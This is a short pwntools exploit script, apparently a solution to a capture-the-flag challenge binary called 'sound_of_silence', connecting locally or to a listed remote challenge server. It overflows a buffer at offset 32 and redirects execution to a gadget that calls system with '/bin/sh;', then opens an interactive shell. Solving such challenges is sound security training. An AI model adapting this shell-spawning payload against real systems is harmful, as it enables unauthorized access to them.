#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './sound_of_silence'
elf = context.binary = ELF(exe, checksec=True)
libc = './glibc/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '94.237.60.74', 43619

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()

    mov_rax_rdi = 0x401169 # <-- use this one, this one calls system afterwards

    offset = 32
    payload = flat({
        offset: [
            b'/bin/sh;',
            mov_rax_rdi
        ]
    })

    io.sendline(payload)

    io.interactive()
    
if __name__ == '__main__':
    exploit()